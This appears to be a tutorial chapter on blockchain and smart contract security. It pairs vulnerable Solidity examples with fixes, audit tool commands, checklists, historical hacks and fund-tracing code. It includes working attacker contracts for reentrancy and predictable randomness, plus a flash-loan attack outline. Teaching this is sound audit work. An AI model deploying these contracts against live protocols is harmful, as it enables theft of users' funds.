# Part 78: Blockchain/Smart Contract Security (Steps 771-780)

## Step 771: Ethereum Smart Contract Security

```python
#!/usr/bin/env python3
# Smart contract security and common vulnerabilities

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class SmartContractVulnerabilities:
    """Common smart contract vulnerabilities"""
    
    # Top smart contract vulnerabilities
    VULNERABILITY_LIST = [
        "Reentrancy",
        "Integer Overflow/Underflow",
        "Front-Running / Transaction Ordering",
        "Timestamp Dependence",
        "Access Control Issues",
        "Uninitialized Storage Pointers",
        "Floating pragma",
        "Unchecked External Calls",
        "Denial of Service",
        "Logic Errors",
        "Oracle Manipulation",
        "Flash Loan Attacks",
    ]
    
    def reentrancy_example(self) -> Dict:
        """Reentrancy vulnerability and fix"""
        vulnerable = '''// VULNERABLE: Reentrancy attack
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABLE: State updated AFTER external call
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // External call before state update - VULNERABLE
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER call - attacker can reenter
        balances[msg.sender] -= amount;  // TOO LATE
    }
}

// ATTACKER CONTRACT
contract Attacker {
    VulnerableBank public bank;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    // Recursive reentrancy attack
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw(1 ether);  // Recurse before balance updated
        }
    }
    
    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);  // Triggers reentrancy
    }
}
'''
        
        fixed = '''// FIXED: Reentrancy protection using Checks-Effects-Interactions
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 amount) public nonReentrant {  // OpenZeppelin guard
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Checks-Effects-Interactions pattern:
        // 1. Checks (require above)
        // 2. Effects (state change FIRST)
        balances[msg.sender] -= amount;
        
        // 3. Interactions (external call LAST)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
'''
        return {"vulnerable": vulnerable, "fixed": fixed}
    
    def integer_overflow_example(self) -> Dict:
        """Integer overflow/underflow vulnerability"""
        vulnerable = '''// VULNERABLE: Integer overflow (Solidity < 0.8.0)
pragma solidity ^0.7.0;

contract Token {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        // In Solidity 0.7, this wraps around (underflow)
        require(balances[msg.sender] - amount >= 0);  // ALWAYS TRUE!
        balances[msg.sender] -= amount;  // Underflow: 0 - 1 = 2^256 - 1
        balances[to] += amount;
    }
}
'''
        
        fixed = '''// FIXED: Solidity 0.8+ has built-in overflow checks
// OR use SafeMath for older versions
pragma solidity ^0.8.0;  // Automatic overflow protection

// OR with older Solidity:
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SecureToken {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
    }
}
'''
        return {"vulnerable": vulnerable, "fixed": fixed}
    
    def access_control_issues(self) -> Dict:
        """Access control vulnerability examples"""
        return {
            "missing_modifier": '''// VULNERABLE: Missing access control on sensitive function
contract Vault {
    address public owner;
    
    constructor() { owner = msg.sender; }
    
    // MISSING: onlyOwner modifier
    function withdrawAll() public {  // Anyone can call this!
        payable(msg.sender).transfer(address(this).balance);
    }
}
''',
            "tx_origin": '''// VULNERABLE: Using tx.origin instead of msg.sender
contract PhishingVuln {
    address public owner;
    
    modifier onlyOwner() {
        require(tx.origin == owner, "Not owner");  // VULNERABLE
        _;
    }
    // Attack: trick owner to call malicious contract -> tx.origin = owner
}
''',
            "fixed": '''// FIXED: Use msg.sender and OpenZeppelin Ownable
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureVault is Ownable {
    function withdrawAll() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
'''
        }


if __name__ == '__main__':
    vulns = SmartContractVulnerabilities()
    print(f"[+] Smart contract vulnerabilities: {len(vulns.VULNERABILITY_LIST)}")
    for v in vulns.VULNERABILITY_LIST:
        print(f"    - {v}")
    
    reentrancy = vulns.reentrancy_example()
    print(f"\n[+] Reentrancy vulnerable code ({len(reentrancy['vulnerable'])} chars)")
    print(f"[+] Fixed version ({len(reentrancy['fixed'])} chars)")
```

## Step 772: Smart Contract Auditing Tools

```python
#!/usr/bin/env python3
# Smart contract auditing and testing tools

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class SmartContractAuditTools:
    """Tools for smart contract security auditing"""
    
    def static_analysis(self, contract_path: str) -> Dict:
        """Static analysis tools for Solidity"""
        return {
            "slither": {
                "basic": f'slither {contract_path}',
                "json_output": f'slither {contract_path} --json results.json',
                "checkers": f'slither {contract_path} --detect reentrancy-eth,suicidal,arbitrary-send',
                "print_info": f'slither {contract_path} --print human-summary',
                "all_checks": f'slither {contract_path} --detect all',
            },
            "mythril": {
                "analyze": f'myth analyze {contract_path} --solc-json=config.json',
                "with_timeout": f'myth analyze {contract_path} --execution-timeout 300',
                "max_depth": f'myth analyze {contract_path} --max-depth 22',
            },
            "oyente": {
                "analyze": f'oyente -s {contract_path}',
            },
            "echidna": {
                "fuzz": f'echidna-test {contract_path} --contract ContractName',
                "config": f'echidna-test {contract_path} --config echidna.yaml',
            }
        }
    
    def dynamic_testing_foundry(self) -> Dict:
        """Foundry framework for smart contract testing"""
        foundry_test = '''// Foundry test for reentrancy
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attacker attacker;
    
    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(address(bank));
        
        // Fund bank with 10 ETH
        vm.deal(address(bank), 10 ether);
        vm.deal(address(attacker), 1 ether);
    }
    
    function testReentrancyAttack() public {
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();
        
        // After attack, bank should be drained
        assertTrue(address(bank).balance == 0, "Bank not drained");
        assertTrue(
            address(attacker).balance > attackerBalanceBefore + 9 ether,
            "Attacker should have profited"
        );
    }
    
    function testFuzzWithdraw(uint256 amount) public {
        amount = bound(amount, 0, 100 ether);
        vm.deal(address(this), amount);
        bank.deposit{value: amount}();
        bank.withdraw(amount);
        assertEq(bank.balances(address(this)), 0);
    }
}
'''
        
        foundry_commands = [
            'forge test  # Run all tests',
            'forge test -vvvv  # Verbose output',
            'forge test --match-test testReentrancy  # Specific test',
            'forge test --fuzz-runs 10000  # Extended fuzzing',
            'forge coverage --report lcov  # Code coverage',
        ]
        
        return {"test_code": foundry_test, "commands": foundry_commands}
    
    def manual_audit_checklist(self) -> List[str]:
        """Manual smart contract audit checklist"""
        return [
            "[ ] Reentrancy: External calls before state changes",
            "[ ] Integer overflow/underflow (pre 0.8.0)",
            "[ ] tx.origin used for authorization",
            "[ ] Block.timestamp/block.number manipulation risk",
            "[ ] Uninitialized storage variables",
            "[ ] msg.value in loops",
            "[ ] Arbitrary DELEGATECALL",
            "[ ] Unchecked return values",
            "[ ] Access control on all sensitive functions",
            "[ ] Front-running vulnerable operations",
            "[ ] Gas griefing via expensive callbacks",
            "[ ] Oracle price manipulation risk",
            "[ ] Flash loan attack surface",
            "[ ] Cross-contract reentrancy",
            "[ ] Proper event emission",
            "[ ] Proper use of require/revert messages",
        ]


if __name__ == '__main__':
    audit = SmartContractAuditTools()
    
    static = audit.static_analysis("./contracts/Bank.sol")
    print("[+] Static analysis tools:")
    for tool, cmds in static.items():
        print(f"    {tool}: {list(cmds.keys())}")
    
    foundry = audit.dynamic_testing_foundry()
    print(f"\n[+] Foundry commands: {foundry['commands']}")
    
    checklist = audit.manual_audit_checklist()
    print(f"\n[+] Audit checklist items: {len(checklist)}")
    for item in checklist[:5]:
        print(f"    {item}")
```

## Step 773: Flash Loan & DeFi Attacks

```python
#!/usr/bin/env python3
# Flash loan attacks and DeFi exploits

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class DeFiAttacks:
    """DeFi protocol attack techniques"""
    
    def flash_loan_attack_example(self) -> str:
        """Flash loan attack structure"""
        return '''// Flash loan attack example
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IFlashLoanProvider {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IVulnerableProtocol {
    function deposit(uint256 amount) external;
    function getPrice() external view returns (uint256);
    function borrow(uint256 collateral) external;
}

contract FlashLoanAttacker {
    IFlashLoanProvider flashProvider;
    IERC20 token;
    IVulnerableProtocol protocol;
    
    constructor(address _flash, address _token, address _protocol) {
        flashProvider = IFlashLoanProvider(_flash);
        token = IERC20(_token);
        protocol = IVulnerableProtocol(_protocol);
    }
    
    function executeAttack(uint256 loanAmount) external {
        // Step 1: Take flash loan (borrow massive amount)
        flashProvider.flashLoan(
            address(this),
            address(token),
            loanAmount,
            abi.encode(loanAmount)
        );
    }
    
    // Called by flash loan provider
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // Step 2: Use borrowed funds to manipulate oracle price
        // Dump tokens to crash price on Uniswap
        // ... price manipulation code ...
        
        // Step 3: Exploit vulnerable protocol at manipulated price
        // Protocol uses Uniswap TWAP -> now manipulated
        protocol.borrow(1 ether);  // Borrow much more than collateral due to low price
        
        // Step 4: Restore price, repay flash loan
        // Sell borrowed assets, buy back tokens
        // ...
        
        // Repay flash loan + fee
        token.approve(address(flashProvider), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
'''
    
    def historical_defi_attacks(self) -> List[Dict]:
        """Historical DeFi attacks and amounts lost"""
        return [
            {"name": "Poly Network (2021)", "loss": "$611M", "method": "Privilege escalation via cross-chain keeper"},
            {"name": "Wormhole (2022)", "loss": "$320M", "method": "Signature verification bypass"},
            {"name": "Ronin Network (2022)", "loss": "$625M", "method": "Validator private key compromise"},
            {"name": "Cream Finance (2021)", "loss": "$130M", "method": "Flash loan + reentrancy"},
            {"name": "Euler Finance (2023)", "loss": "$197M", "method": "Donation attack + liquidation"},
            {"name": "Beanstalk (2022)", "loss": "$182M", "method": "Flash loan governance attack"},
            {"name": "BadgerDAO (2021)", "loss": "$120M", "method": "Frontend compromise (Cloudflare Workers)"},
            {"name": "Nomad Bridge (2022)", "loss": "$190M", "method": "Improper Merkle root initialization"},
        ]
    
    def price_oracle_manipulation(self) -> Dict:
        """Price oracle manipulation techniques"""
        return {
            "description": "Manipulate price oracle to exploit dependent protocols",
            "single_block_manipulation": [
                "Flash loan large amount of token",
                "Trade on AMM (Uniswap/Curve) to move price",
                "Protocol reads spot price from AMM (vulnerable)",
                "Exploit at manipulated price",
                "Repay flash loan in same transaction",
            ],
            "twap_manipulation": [
                "TWAP (Time-Weighted Average Price) more resistant",
                "Requires manipulation over multiple blocks",
                "Still possible with sustained capital",
            ],
            "oracle_solutions": [
                "Chainlink price feeds (external, decentralized)",
                "TWAP with long time window (30 minutes+)",
                "Multi-oracle aggregation",
                "Circuit breakers for abnormal price moves",
            ]
        }
    
    def rug_pull_analysis(self) -> Dict:
        """Rug pull detection and analysis"""
        return {
            "types": [
                {"type": "Hard Rug", "method": "Team drains liquidity pool"},
                {"type": "Soft Rug", "method": "Team gradually sells tokens"},
                {"type": "Exit Scam", "method": "Project abandoned after fundraise"},
                {"type": "Honeypot", "method": "Can buy but not sell tokens"},
            ],
            "red_flags": [
                "Anonymous team",
                "No audit",
                "Liquidity not locked",
                "Hidden mint/burn functions",
                "Owner can pause trading",
                "Excessive team token allocation",
                "Copy-paste contract code",
            ],
            "detection_tools": [
                "TokenSniffer.com",
                "Honeypot.is",
                "rug.ai",
                "De.fi scanner",
            ]
        }


if __name__ == '__main__':
    defi = DeFiAttacks()
    
    attacks = defi.historical_defi_attacks()
    print(f"[+] Historical DeFi attacks: {len(attacks)}")
    for attack in attacks[:5]:
        print(f"    {attack['name']}: {attack['loss']} - {attack['method']}")
    
    oracle = defi.price_oracle_manipulation()
    print(f"\n[+] Oracle manipulation steps: {len(oracle['single_block_manipulation'])}")
    
    rug = defi.rug_pull_analysis()
    print(f"\n[+] Rug pull red flags: {len(rug['red_flags'])}")
    for flag in rug['red_flags']:
        print(f"    - {flag}")
```

## Step 774: Blockchain Forensics

```python
#!/usr/bin/env python3
# Blockchain transaction analysis and forensics

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class BlockchainForensics:
    """Blockchain transaction analysis"""
    
    def trace_stolen_funds(self, tx_hash: str) -> Dict:
        """Trace stolen funds across blockchain"""
        python_trace = f'''from web3 import Web3
import json

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/YOUR_KEY"))

def trace_funds(start_tx):
    # Get transaction
    tx = w3.eth.get_transaction(start_tx)
    receipt = w3.eth.get_transaction_receipt(start_tx)
    
    print(f"From: {{tx['from']}}")
    print(f"To: {{tx['to']}}")
    print(f"Value: {{w3.from_wei(tx['value'], 'ether')}} ETH")
    print(f"Gas Used: {{receipt['gasUsed']}}")
    
    # Trace internal transactions
    trace = w3.provider.make_request("debug_traceTransaction", [
        start_tx,
        {{"tracer": "callTracer"}}
    ])
    return trace

# Analyze token transfers in event logs
def get_token_transfers(tx_hash):
    receipt = w3.eth.get_transaction_receipt(tx_hash)
    
    # ERC20 Transfer event signature
    transfer_topic = w3.keccak(text="Transfer(address,address,uint256)").hex()
    
    transfers = []
    for log in receipt["logs"]:
        if log["topics"][0].hex() == transfer_topic:
            from_addr = "0x" + log["topics"][1].hex()[26:]
            to_addr = "0x" + log["topics"][2].hex()[26:]
            amount = int(log["data"], 16)
            transfers.append({{"from": from_addr, "to": to_addr, "amount": amount}})
    
    return transfers
'''
        
        tools = [
            "Etherscan.io - transaction explorer",
            "Tenderly - transaction tracing",
            "MistTrack - crypto tracking (Slowmist)",
            "TRM Labs - blockchain analytics",
            "Chainalysis - forensics platform",
            "Breadcrumbs.app - free visualization",
        ]
        
        return {"python_code": python_trace, "tools": tools}
    
    def mixing_detection(self) -> Dict:
        """Detect cryptocurrency mixing/tumbling"""
        return {
            "mixers": [
                {"name": "Tornado Cash", "chain": "Ethereum", "status": "Sanctioned (OFAC)"},
                {"name": "Bitcoin Mixer", "chain": "Bitcoin", "status": "Various"},
                {"name": "Wasabi Wallet", "chain": "Bitcoin", "status": "CoinJoin"},
            ],
            "detection_indicators": [
                "Fixed-amount deposits (0.1 ETH, 1 ETH, etc.)",
                "Time delays between deposit and withdrawal",
                "Use of 0x000000 addresses (burned)",
                "On-chain interaction with known mixer contracts",
                "Tornado Cash contract address interaction",
            ],
            "taint_analysis": [
                "Forward tracing: where do funds go?",
                "Backward tracing: where did funds come from?",
                "Cluster analysis: group addresses by ownership",
            ]
        }


@dataclass
class NFTSecurity:
    """NFT security issues"""
    
    def nft_vulnerabilities(self) -> Dict:
        """Common NFT vulnerabilities"""
        return {
            "metadata_attacks": [
                "Mutable metadata (IPFS vs centralized server)",
                "Rug pull via metadata change",
                "XSS in SVG/HTML NFT metadata",
            ],
            "contract_vulnerabilities": [
                "Mint function allows minting to arbitrary address",
                "royalty bypass (EIP-2981 not enforced)",
                "Incorrect ERC721 implementation",
                "Unchecked mint counter (mint more than supply)",
            ],
            "marketplace_attacks": [
                "OpenSea bid sniping",
                "Approval phishing (setApprovalForAll)",
                "Fake NFT collections (look-alike)",
            ],
            "famous_hacks": [
                "Bored Ape Yacht Club Discord hack (2022) - $10M",
                "OpenSea phishing attacks",
                "NFT wash trading schemes",
            ]
        }


@dataclass
class Web3SecurityChecklist:
    """Complete Web3 security checklist"""
    
    def audit_checklist(self) -> Dict:
        """Comprehensive Web3 security audit checklist"""
        return {
            "smart_contract": [
                "Static analysis (Slither, Mythril)",
                "Fuzz testing (Echidna, Foundry)",
                "Manual review for business logic",
                "Formal verification for critical functions",
            ],
            "defi_protocol": [
                "Oracle manipulation attack surface",
                "Flash loan attack scenarios",
                "Governance attack scenarios",
                "Economic model review (tokenomics)",
                "Liquidity risks",
            ],
            "infrastructure": [
                "Node security (private key management)",
                "RPC endpoint security",
                "Frontend security (XSS, CSRF)",
                "DNS security",
                "CDN and supply chain",
            ],
            "operational": [
                "Multisig for admin functions",
                "Timelocks for critical changes",
                "Emergency pause mechanism",
                "Incident response plan",
                "Bug bounty program",
            ]
        }


if __name__ == '__main__':
    forensics = BlockchainForensics()
    trace = forensics.trace_stolen_funds("0x")
    print(f"[+] Blockchain forensics tools: {trace['tools']}")
    
    mixing = forensics.mixing_detection()
    print(f"\n[+] Known mixers: {len(mixing['mixers'])}")
    print(f"[+] Detection indicators: {len(mixing['detection_indicators'])}")
    
    nft = NFTSecurity()
    vulns = nft.nft_vulnerabilities()
    print(f"\n[+] NFT vulnerability categories: {list(vulns.keys())}")
    
    checklist = Web3SecurityChecklist()
    audit = checklist.audit_checklist()
    print(f"\n[+] Web3 audit categories: {list(audit.keys())}")
```

## Steps 775-780: More Blockchain Security Topics

```python
#!/usr/bin/env python3
# Additional blockchain security topics (Steps 775-780)

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class CryptographyAttacks:
    """Cryptographic vulnerabilities in blockchain"""
    
    def weak_randomness(self) -> Dict:
        """Weak randomness in smart contracts"""
        return {
            "vulnerable_sources": [
                "block.timestamp",
                "block.number",
                "block.difficulty (now block.prevrandao)",
                "blockhash(block.number - 1)",
                "address(this).balance",
                "msg.sender",
            ],
            "attack": '''// Attack: predict lottery outcome
contract LotteryAttacker {
    ILottery lottery;
    
    function attack() external {
        // Predict "random" number - same computation as lottery
        uint256 prediction = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            msg.sender
        ))) % 10;
        
        lottery.guess(prediction);  // Always wins
    }
}
''',
            "fix": "Use Chainlink VRF (Verifiable Random Function) for secure randomness"
        }
    
    def front_running_attacks(self) -> Dict:
        """Front-running and MEV attacks"""
        return {
            "types": [
                {"type": "Front-running", "description": "Attacker sees pending tx, submits own with higher gas"},
                {"type": "Sandwich Attack", "description": "Buy before victim tx, sell after"},
                {"type": "Back-running", "description": "Execute after victim tx to profit from state change"},
                {"type": "Time-Bandit", "description": "Reorg chain to steal profitable transactions"},
            ],
            "mitigations": [
                "Commit-reveal scheme",
                "Flashbots MEV protection",
                "Private mempool services",
                "Slippage tolerance",
                "Dutch auction mechanisms",
            ]
        }


@dataclass
class LayerTwoSecurity:
    """Layer 2 and bridge security"""
    
    def bridge_vulnerabilities(self) -> Dict:
        """Cross-chain bridge vulnerabilities"""
        return {
            "common_issues": [
                "Signature verification bypass (Wormhole 2022)",
                "Insufficient validation of messages from chains",
                "Replay attacks across chains",
                "Centralized validator compromise",
                "Oracle/relayer manipulation",
            ],
            "locked_value_risk": "Bridges hold large amounts -> high-value targets",
            "famous_bridge_hacks": [
                "Ronin (Axie Infinity) - $625M - validator key compromise",
                "Wormhole - $320M - signature verification bypass",
                "Nomad Bridge - $190M - Merkle root bug",
                "Harmony Horizon - $100M - multisig compromise",
                "Poly Network - $611M - privilege escalation",
            ],
            "testing_methodology": [
                "Review cross-chain message validation",
                "Test for replay attacks between chains",
                "Verify oracle/relayer security",
                "Check admin key management",
                "Analyze economic incentives",
            ]
        }


if __name__ == '__main__':
    crypto = CryptographyAttacks()
    random = crypto.weak_randomness()
    print(f"[+] Weak randomness sources: {len(random['vulnerable_sources'])}")
    for src in random['vulnerable_sources']:
        print(f"    - {src}")
    
    front = crypto.front_running_attacks()
    print(f"\n[+] MEV attack types: {len(front['types'])}")
    for attack in front['types']:
        print(f"    {attack['type']}: {attack['description']}")
    
    l2 = LayerTwoSecurity()
    bridges = l2.bridge_vulnerabilities()
    print(f"\n[+] Famous bridge hacks: {len(bridges['famous_bridge_hacks'])}")
    total_loss = "$1.8B+"
    print(f"[+] Total approximate losses: {total_loss}")
    for hack in bridges['famous_bridge_hacks']:
        print(f"    {hack}")
```
